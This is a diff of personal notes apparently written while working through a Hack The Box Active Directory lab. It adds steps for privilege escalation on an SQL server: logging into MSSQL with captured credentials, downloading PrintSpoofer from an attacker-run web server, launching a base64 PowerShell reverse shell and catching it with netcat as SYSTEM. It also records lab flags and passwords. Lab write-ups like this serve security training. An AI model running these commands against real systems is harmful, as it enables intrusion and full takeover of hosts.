@@ -62,8 +62,16 @@ Output: User ID=netdb;Password=D@ta_bAse_adm1n!"
 
 Question 7 - Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host. - s3imp3rs0nate_cl@ssic
 1) log into htb-student ssh 
-2)
-i neeed to come back to thsi and write the steps out cause holy shit. 
+2) mssqlclient.py -dc-ip 172.16.7.3 INLANEFREIGHT.LOCAL/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
+3) make sure to have printspoofer SCP'd from desktop onto SQL session with Invoke-WebRequest -URI http://172.16.7.240:8000/PrintSpoofer64.exe -OutFile .\PrintSpoofer.exe 
+4) open revshells.com and use powershell 3 base64 -> change shell to /bin/bash 
+4) IN THE PRXYCHAINED SSH - D session run nc -nlvp <port from above revshell> 
+5) get the same revshell basde64 but change the port to 3434 or wahtever you want 
+6) in SQL terminal on -D session with PrintSpoofer loaded run -> .\PrintSpoofer.exe -i -c "pwoershell -e Base64 shit here" 
+7) in new ssh session run -> nc -nlvp 
+8) catch shell 
+9) whoami = nt authority\system
+10) cd C:\Users\Administrator\Desktop + type flag.txt = s3imp3rs0nate_cl@ssic
 
 scp both these to htb-student@10.129.32.184 then from a new ssh htb-student sesseion run python3 -m http.server THEN -> 
 
